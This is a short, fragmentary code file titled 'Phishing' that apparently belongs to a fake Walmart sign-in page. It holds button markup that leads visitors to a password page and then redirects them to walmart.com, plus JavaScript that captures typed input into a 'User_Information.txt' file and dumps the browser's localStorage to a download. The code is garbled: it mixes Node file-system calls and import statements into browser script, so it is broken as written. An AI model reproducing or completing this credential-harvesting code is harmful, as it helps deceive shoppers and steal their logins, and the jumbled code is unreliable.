# Phishing
<button class="buttons" type="submit" role="button" onClick="parent.open('./html/password.html')">Continue</button>
<button class="w_hhLG w_8nsR w_jDfj w-100" type="submit" name="redirect" onClick="location.open('https://walmart.com')">
                                                        Sign In</button>
                                                              let val = document.getElementById("Email").innerHTML;
      console.log(val);
              const fs = require('fs').promises;
              import fs from 'fs';
                    function getVal() {
        const val = document.querySelector('input').value;
        let fs = require('fs').promises;
        fs.writeFile('./User_Information.txt', val, (err) => {
          if (err) throw err;
        })
      }


                                                        function saveLocalStorageToFile() {
                                                            // Get the local storage data
                                                            const data = JSON.stringify(localStorage);
                                                            
                                                            // Create a blob with the data
                                                            const blob = new Blob([data], {type: "application/json"});
                                                            
                                                            // Create a link to the file and click it to download the file
                                                            const link = document.createElement("a");
                                                            link.download = "local_storage_data.json";
                                                            link.href = URL.createObjectURL(blob);
                                                            link.click();
                                                        }